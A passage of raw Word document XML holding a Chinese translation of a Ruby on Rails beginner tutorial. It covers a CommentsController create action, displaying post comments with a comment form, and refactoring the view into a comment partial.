      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action，因此让我们补充上下面的内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7176"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6FC97685" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B7F972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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CommentsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18D6F94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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A25FC8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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:post_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E55717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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= @post.comments.create(params[:comment])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EEE41A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redirect_to post_path(@post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7558E39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6E207F8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1ED4BEBC"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这里你看到的会比你在 controller 中为 posts 做的要复杂点。那就是你刚刚你刚补充的副作用；每个面向 comment 的请求都保持了它所依附的 post 的踪迹(id)，因此这样初始化 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候匹配相应的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> model（时）得到了答案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A5F3DB"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此外，上面的代码带来的好处就是使得一些对于 association 的方法可用。我们使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来新建和保存 comment。这里将会自动连接link使得 comment 依附于对应的 post。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1389164B"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一旦我们评论过后，我们使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post_path(@post)</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 导引用户到先前的 post。正如我们已经看到的，这里调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action它将返回并渲染show.html.erb 模板。这里也是我们想让 comment 显示的地方，因此让我们添加（那些代码）到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">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6576"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="46B06E1B" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D28E6C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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="752A4E9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7315B8B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235C37C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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23D5559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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A4067F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23E0D20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02E6674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5C15F27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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="510415A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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24C0792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06F45E7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67D9469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1575C14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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6184CA5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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E54182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3B2F0C6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16FC61E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&lt;h2&gt;Comments&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B45A10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@post.comments.each</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|comment| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="693E906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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2035E48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&lt;b&gt;Commenter:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E8D029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comment.commenter %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A8EB6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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="755C20D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6A63CD9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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11D1ECD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&lt;b&gt;Comment:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D780B0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comment.body %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="414B453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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FAA06C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38D2A69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044D751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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A9136A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form_for([@post, @post.comments.build]) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FEAECA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128594C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f.label :commenter</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29A9E63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f.text_field :commenter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75F1CE3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5880954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57EABBE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f.label :body</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633745D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f.text_area :body</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5A800AE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7D2FDF3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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3092446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f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7655EE2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599EB28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3834974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549C404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095ADA8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7D7F4F9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'Edit Post', edit_post_path(@post) %&gt;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181DB4D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'Back to Posts', posts_path %&gt;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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="797CEA41"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现在你可以添加 posts 和 comments 到你的 blog 同时随后他们会在相应的地方显示出来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4833C7C2"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11 重构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058338F8"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现在我们已经有Posts和Comments开始工作了，如果我们注意一下 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模板，发现它变得太长而且很别扭。我们可以使用 partials 来整理它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162D2D41"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 xml:space="preserve">11.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Rendering Partial Collections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2DE211"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首先我们会创建一个 comment partial 来专门显示 post 的所有的 comments。创建文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/comments/_comment.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并输入如下内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3576"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6316453C" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21467CA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282890F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&lt;b&gt;Commenter:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="374D66E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comment.commenter %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F72C28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609E925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3E61A5E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432701B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&lt;b&gt;Comment:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A78843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comment.body %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C74420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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="686AF33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然后在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 你可以相应的这样更改：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6576"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="495896F3" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A00D4A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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CEADE7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19644B6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37AC6FC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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D49E1B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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="466505F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2CA1CE1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566BEC2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0550271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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EF814F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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E49146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149FC68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5090C59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5CFA39A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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0682B42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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F46190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1F3A173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1299DA1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&lt;h2&gt;Comments&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="334FC1C0" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00634195">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render @post.comments %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15C8BB1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50BE411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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DD4D49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form_for([@post, @post.comments.build]) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58ED9E7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2EE6339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f.label :commenter</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505636A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f.text_field :commenter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167C1FE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32E0BC5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72A5D36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f.label :body</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5EAD18E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f.text_area :body</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31A105C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09683F9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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F5BA36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f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="799948D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088C3B7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06D1481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25C6DB9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58E21B4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753D1ED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'Edit Post', edit_post_path(@post) %&gt;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44D5638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'Back to Posts', posts_path %&gt;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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66A3BEB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这里会</w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">把 </w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合的每一个 comment 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>app/views/comments/_comment.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模板中渲染</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当渲染方法迭代完 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合时候，它</w:t>
      </w:r>
      <w:r w:rsidRPr="009522AD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
